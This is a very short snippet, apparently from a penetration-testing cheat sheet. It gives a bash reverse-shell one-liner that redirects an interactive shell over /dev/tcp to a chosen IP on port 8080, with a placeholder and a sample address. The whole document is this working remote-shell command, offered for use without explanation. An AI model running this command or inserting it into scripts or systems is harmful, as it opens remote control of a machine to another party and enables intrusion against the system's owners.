Replace {IP} with your IP 

bash -i >& /dev/tcp/{IP}/8080 0>&1

example: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
